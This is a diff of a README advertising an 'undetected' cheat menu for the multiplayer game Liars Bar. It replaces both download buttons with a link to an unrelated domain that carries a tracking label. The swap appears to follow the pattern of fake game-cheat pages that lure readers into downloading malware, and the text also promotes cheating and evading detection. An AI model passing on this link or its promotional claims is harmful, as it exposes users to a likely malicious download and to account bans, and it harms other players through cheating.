@@ -2,7 +2,7 @@
 
 The **Liars Bar Cheat Menu** is a powerful, undetected external mod designed to enhance your experience in the chaotic world of *Liars Bar*. Whether you're trying to outwit your opponents or uncover hidden roles with ease, this cheat menu equips you with the ultimate toolkit to control the outcome of every round.
 
-[![Download LiarsBar CheatMenu](https://img.shields.io/badge/Download-LiarsBar%20CheatMenu-blueviolet)](https://liars-bar-cheat-menu.github.io/.github/)
+[![Download LiarsBar CheatMenu](https://img.shields.io/badge/Download-LiarsBar%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 From revealing player roles to auto-winning mini-games, the Liars Bar Cheat Menu provides a strategic advantage in this social deduction game built on bluffing, manipulation, and timing.
 
@@ -27,4 +27,4 @@ From revealing player roles to auto-winning mini-games, the Liars Bar Cheat Menu
 
 ---
 
-[![Download LiarsBar CheatMenu](https://img.shields.io/badge/Download-LiarsBar%20CheatMenu-blueviolet)](https://liars-bar-cheat-menu.github.io/.github/)
+[![Download LiarsBar CheatMenu](https://img.shields.io/badge/Download-LiarsBar%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
